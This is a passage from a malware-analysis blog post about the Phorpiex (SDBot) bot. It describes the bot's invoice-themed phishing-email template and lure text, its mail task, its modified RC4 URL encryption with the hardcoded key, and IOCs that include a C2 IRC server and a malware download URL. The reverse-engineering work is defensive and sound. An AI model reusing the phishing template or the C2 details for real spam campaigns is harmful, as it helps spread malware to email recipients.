mail:</p><pre><code>MAIL FROM: &lt;[firstname][2_random_digits]@[domain]&gt;  
RCPT TO: &lt;[recv_email]&gt;   
DATA 
Received: from [5_random_letters] ([random_ip]) by [domain] with MailEnable ESMTP; [date]
Received: (qmail [3_random_digits] invoked by uid [3_random_digits]); [date]
From: [firstname] [last_name] [send_email] 
To: [recv_email]
Subject: [random_subject][4_random_digits]
Date: [date]
Message-ID: &lt;[14_random_digits].[4_random_digits].qmail@[6_random_letters]
Mime-Version: 1.0
Content-Type: multipart/mixed; boundary= "[boundary]"

-- [boundary]
Content-Type: text/plain; charset=US-ASCII

Dear Customer

to see more details about your order please open the attachment 
and reply as soon as possible.

Thank you,
AWG Customer Service

-- [boundary]
Content-Type: application/octet-stream
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename= "DOC[10_random_digits].zip"

[payload]

-- [boundary] 
---
.
</code></pre><p>with:</p><ul><li><code>[firstname]</code>: randomly picked name from this list: <em>Adolfo, Adolph, Adrian, Adrian, Adriana, Adrienne, Agnes, Agustin, Ahmad, Ahmed, Aida, Aileen, Aimee, Aisha, Beulah, Beverley, Beverly, Bianca, Bill, Billie, Billie, Billy, Blaine, Blair, Blake, Blanca, Blanche, Bob, Bobbi, Bobbie, Bobby, Bonita, Bonnie, Booker, Boris, Boyd, Brad, Bradford, Bradley, Bradly, Brady, Deann, Deanna, Deanne, Debbie, Debora, Deborah, Debra, Dee, Dee, Deena, Deidre, Deirdre, Delbert, Delia, Gilda, Gina, Ginger, Gino, Giovanni, Gladys, Glen, Glenda, Glenn, Glenna, Gloria, Goldie, Gonzalo, Gordon, Hugh, Hugo, Humberto, Hung, Hunter, Ian, Ida, Ignacio, Ila, Ilene, Imelda, Imogene, Ina, Ines, Tania, Tanisha, Tanner, Tanya, Tara, Tasha, Taylor, Taylor, Ted, Teddy, Terence, Teresa, Teri, Terra</em></li><li><code>[last_name]</code>: randomly picked name for this list: <em>Bailey, Rivera, Cooper, Richardson, Cox, Howard, Ward, Torres, Peterson, Gray, Ramirez, James, Baker, Gonzalez, Nelson, Carter, Mitchell, Perez, Roberts, Turner, Phillips, Campbell, Parker, Evans, Edwards, Collins, Stewart, Sanchez, Morris, Rogers, Reed, Cook, Morgan, Bell, Murphy, Jackson, White, Harris, Martin, Thompson, Garcia, Martinez, Robinson, Clark, Rodriguez, Lewis, Lee, Walker, Hall, Allen, Young, Hernandez, King, Wright, Lopez, Hill, Scott, Green, Adams, Smith, Johnson, Williams, Jones, Brown, Davis, Miller, Wilson, Moore, Taylor, Anderson, Thomas, Watson, Brooks, Kelly, Sanders, Price, Bennett, Wood, Barnes, Ross, Henderson, Coleman, Jenkins</em></li><li><code>[domain]</code>: the four-digit <em>.com</em> domain from Step 4 in the previous Section.</li><li><code>[random_ip]</code>: randomly determined IP by picking four integers 1 to 255.</li><li><code>[date]</code>: the current date.</li><li><code>[send_email]</code>: The random email address built in <a href="#Originating-Email-Address">Originating Email Address</a>.</li><li><code>[recv_email]</code>: the mail address from file <em>E</em>.</li><li><code>[random_subject]</code>: one of the following 7 subjects: <em>“Document #”</em>, <em>“Your Document #”</em>, <em>“Order #”</em>, <em>“Your Order #”</em>, <em>“Invoice #”</em>, <em>“Payment #”</em>, <em>“Payment Invoice #”</em></li><li><code>[random_boundary]</code>: random mime boundary of format <code>&lt;6_random_letters&gt;_&lt;8_random_letters&gt;_&lt;4_random_letters&gt;</code></li><li><code>[payload]</code>: the base64 encoded zip file <em>D</em>.</li></ul><p>For example:</p><pre><code>MAIL FROM: &lt;Adrian32@1234.com&gt;
RCPT TO: &lt;victim@example.com&gt;
DATA
Received: from yehdk ([39.212.182.82]) by 1234.com with MailEnable ESMTP; Thu, 18 Feb 2016 03:45:08 -0700 (PDT)
Received: (qmail 921 invoked by uid 381); Thu, 18 Feb 2016 03:45:08 -0700 (PDT)
From: Adrian Cox &lt;Adrian32@1234.com&gt;
To: &lt;victim@example.com&gt;
Subject: Invoice #3829
Date: Thu, 18 Feb 2016 03:45:08 -0700 (PDT)
Message-ID: &lt;82847121234313.9232.qmail@abyuee
Mime-Version: 1.0
Content-Type: multipart/mixed; boundary= "udkeja_ueybmsqw_uoer"

-- udkeja_ueybmsqw_uoer
Content-Type: text/plain; charset=US-ASCII

Dear Customer

to see more details about your order please open the attachment 
and reply as soon as possible.

Thank you,
AWG Customer Service

-- udkeja_ueybmsqw_uoer
Content-Type: application/octet-stream
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename= "DOC8253877622.zip"

bWFsaWNpb3VzIGNvZGU=   

-- udkeja_ueybmsqw_uoer
---
.
</code></pre><p>After sending the mail, Phorpiex exits the SMTP server with <code>QUIT</code></p><h3 id="mx---mail-exe-without-server-list">m.x - Mail Exe without Server List</h3><p>The fourth and last task is very similar to <code>m.s</code></p><dl><dt>format</dt><dd><code>m.x &lt;enc_url&gt; &lt;nr_of_files&gt;</code> |</dd><dt>nr of parameters</dt><dd>2 |</dd><dt>subtypes</dt><dd>none |</dd><dt>example</dt><dd><code>m.x |108|99|(...)|106| 302</code> |</dd><dt>description</dt><dd>Mail an Executable |</dd><dt>task id</dt><dd>2 (exclusive) |</dd></dl><p>The differences to <code>m.s</code> are the following:</p><ul><li><p>The task uses ID 2 instead of 3.</p></li><li><p><a href="#m.s-mail-executable">Step 11</a> is skipped, i.e., no file <em>B</em> of SMTP servers is downloaded.</p></li><li><p>In lieu of the SMTP server file, Phorpiex uses the following target information:</p><ul><li><code>[server]</code>: the server is set to the domain part of the target email address, e.g., the target mail <code>victim@example.com</code> would yield the server <code>example.com</code>.</li><li><code>[username]</code>: (null)</li><li><code>[password]</code>: (null)</li><li><code>[port]</code>: set to 25</li></ul></li><li><p>The SMTP authentication is skipped.</p></li></ul><h2 id="rc4-implementation">RC4 Implementation</h2><p>All URLs sent to the client are encrypted with a non-standard RC4 cipher. The ciphertext bytes are sent as integers separated and enclosed by the pipe symbol <code>|</code>. For example, the bytes <code>\x0B\xAD</code> are transmitted as <code>|11|173|</code>.</p><p>The RC4 implementation differs from the standard in two points:</p><ol><li>the state vector <em>S</em> only has 40 elements instead of the common 256.</li><li>the implementation uses the <a href="https://en.wikipedia.org/wiki/XOR_swap_algorithm">XOR swap algorithm</a> to permutate <em>S</em>, both in key-scheduling and in generating the keystream. The XOR swap algorithm, however, only works on <em>distinct</em> values; in RC4 this is not necessary the case as <em>i</em> and <em>j</em> can be equal. In those cases, the respective value is zeroed out.</li></ol><p>The implementation in pseudo-code looks like that:</p><pre><code>FOR i FROM 0 to 39 
    S[i] := i
ENDFOR
j := 0
FOR i FROM 0 to 39
    j:= (j + S[i] + key[i mod keylength]) mod 40
    S[i] ^= S[j]
    S[j] ^= S[i]
    S[i] ^= S[j]
ENDFOR

i := 0
j := 0
FOR c IN ciphertext
    i := (i+1) mod 40
    j := (j + S[j]) mod 40
    S[i] ^= S[j]
    S[j] ^= S[i]
    S[i] ^= S[j]
    K = S[(S[i] + S[j]) mod 40]
    OUTPUT c XOR K
ENDFOR
</code></pre><p>The key to decipher the URLs is hardcoded to <code>trk</code>, with the key length hard-coded to 2; so the actual key is <strong>tr</strong>.</p><h2 id="iocs">IOCs</h2><table><thead><tr><th>IOC (Example)</th><th>Type</th><th>Remarks</th></tr></thead><tbody><tr><td><code>w6</code></td><td>mutex</td><td>also the name of updates</td></tr><tr><td><code>%Temp%\&lt;10_random_letters&gt;.bat</code> (<code>C:\Users\User\AppData\Local\Temp\ukelbadejs.bat</code>)</td><td>cleanup BAT file</td><td></td></tr><tr><td><code>{%windir%,%userprofile%,%temp%}\M-50504503224255244048500220524542045\winsvc.exe</code> (<code>C:\Users\User\M-50504503224255244048500220524542045\winsvc.exe</code>)</td><td>binary location</td><td></td></tr><tr><td><code>220.181.87.80:5050</code></td><td>IRC server</td><td>the only IRC used by the sample</td></tr><tr><td><code>http://sideworkcreative.com/go.exe</code> (hacked site)(hacked site)(hacked site)(hacked site)(hacked site)(hacked site)(hacked site)(hacked site)(hacked site)</td><td>download URL</td><td>observed URL to download additional binaries</td></tr></tbody></table><h2 id="comments">Archived Comments</h2><div><p><i><strong>Note: </strong>I removed the Disqus integration in an effort to cut down on bloat. The following comments were retrieved with the export functionality of Disqus. If you have comments, please reach out to me by Twitter or email.</i></p></div><div class="bt"><div class="thread"><div class="comment"><a href="https://disqus.com/by/metahuman/"><span class="author">Metahuman</span> </a><span class="date">Feb 24, 2016 18:11:26 UTC</span><div class="message"><p>This looks like a normal SDBot from the olden times.</p></div></div><div class="thread"><div class="comment"><a href="https://disqus.com/by/baderj/"><span class="author">Johannes Bader</span> </a><span class="date">Feb 24, 2016 18:31:18 UTC</span><div class="message"><p>Yes, the two are definitely related. McAfee and others still use the name SDBot. Microsoft started to use the name Phorpiex instead.</p></div></div></div></div></div></div></article></main><footer><div><div class="y"><div class="z ae aj"><div class="ag ak al am"><h3>Links</h3><ul class="i an"><li><a href="http://www.twitter.com/viql" rel="me"><svg viewBox="0 0 35 32" class="g"><use href="/assets/svg/icons.svg#icon-twitter" xlink:href="/assets/svg/icons.svg#icon-twitter"></use></svg> Twitter</a></li><li><a href="http://www.github.com/baderj" rel="me"><svg viewBox="0 0 35 32" class="g"><use href="/assets/svg/icons.svg#icon-github" xlink:href="/assets/svg/icons.svg#icon-github"></use></svg> GitHub</a></li><li><a href="mailto:hello@bin.re" rel="me"><svg viewBox="0 0 35 32" class="g"><use href="/assets/svg/icons.svg#icon-envelope-o" xlink:href="/assets/svg/icons.svg#icon-envelope-o"></use></svg> Mail</a></li><li><a href="https://keybase.io/baderj" rel="me"><svg viewBox="0 0 35 32" class="g"><use href="/assets/svg/icons.svg#icon-keybase" xlink:href="/assets/svg/icons.svg#icon-keybase"></use></svg> Keybase</a></li><li><a href="/feed.xml" rel="me"><svg viewBox="0 0 35 32" class="g"><use href="/assets/svg/icons.svg#icon-feed" xlink:href="/assets/svg/icons.svg#icon-feed"></use></svg> RSS</a></li><li><a href="https://threatcat.ch" rel="me"><svg viewBox="0 0 35 32" class="g"><use href="/assets/svg/icons.svg#icon-threatcat" xlink:href="/assets/svg/icons.svg#icon-threatcat"></use></svg> Threatcat.ch</a></li><li><a href="https://infosec.exchange/@viql" rel="me"><svg viewBox="0 0 35 32" class="g"><use href="/assets/svg/icons.svg#icon-mastodon" xlink:href="/assets/svg/icons.svg#icon-mastodon"></use></svg> Mastodon</a></li><li><a href="https://rosti.bin.re" rel="me"><svg viewBox="0 0 35 32" class="g"><use href="/assets/svg/icons.svg#icon-rosti" xlink:href="/assets/svg/icons.svg#icon-rosti"></use></svg> Rösti</a></li></ul></div><div class="ag ak al am"><div><h3>Categories</h3><ul class="i"><li><a href="/category/reverse-engineering">reverse-engineering</a> <span class="ao">(81)</span></li><li><a href="/category/tutorial">tutorial</a> <span class="ao">(14)</span></li><li><a href="/category/project-euler">project-euler</a> <span class="ao">(13)</span></li><li><a href="/category/misc">misc</a> <span class="ao">(2)</span></li><li><a href="/category/visualization">visualization</a> <span class="ao">(2)</span></li></ul></div></div><div class="ag ak al am a7"><div><h3>Tags</h3><span class="ap"><a href="/tag/malware-analysis" class="aq">malware-analysis <span class="ao">(42)</span></a><a href="/tag/dga" class="aq">dga <span class="ao">(36)</span></a><a href="/tag/crackmes" class="aq">crackmes <span class="ao">(23)</span></a><a href="/tag/practical-reverse-engineering" class="aq">practical-reverse-engineering <span class="ao">(16)</span></a><a href="/tag/math" class="aq">math <span class="ao">(15)</span></a><a href="/tag/project-euler" class="aq">project-euler <span class="ao">(13)</span></a><a href="/tag/python" class="aq">python <span class="ao">(12)</span></a><a href="/tag/upatre" class="aq">upatre <span class="ao">(4)</span></a><a href="/tag/visualization" class="aq">visualization <span class="ao">(4)</span></a><a href="/tag/d3js" class="aq">d3js <span class="ao">(3)</span></a></span> <a href="/tag/" class="ar">show all</a></div></div><div class="ag ak al am as"><div class="at"><div><h3>Blog Archive</h3><span class="au"><a href="/2013">2013</a><span class="ao">(20)</span></span> <span class="au"><a href="/2014">2014</a><span class="ao">(46)</span></span> <span class="au"><a href="/2015">2015</a><span class="ao">(24)</span></span> <span class="au"><a href="/2016">2016</a><span class="ao">(6)</span></span> <span class="au"><a href="/2018">2018</a><span class="ao">(1)</span></span> <span class="au"><a href="/2019">2019</a><span class="ao">(2)</span></span> <span class="au"><a href="/2020">2020</a><span class="ao">(5)</span></span> <span class="au"><a href="/2021">2021</a><span class="ao">(3)</span></span> <span class="au"><a href="/2022">2022</a><span class="ao">(3)</span></span> <span class="au"><a href="/2023">2023</a><span class="ao">(2)</span></span></div></div></div></div></div><div class="y av"><div class="z"><div class="ag"><p>© 2012 - 2024 Johannes Bader, last updated March 27, 2024</p></div></div></div></div></footer></div></div></body></html>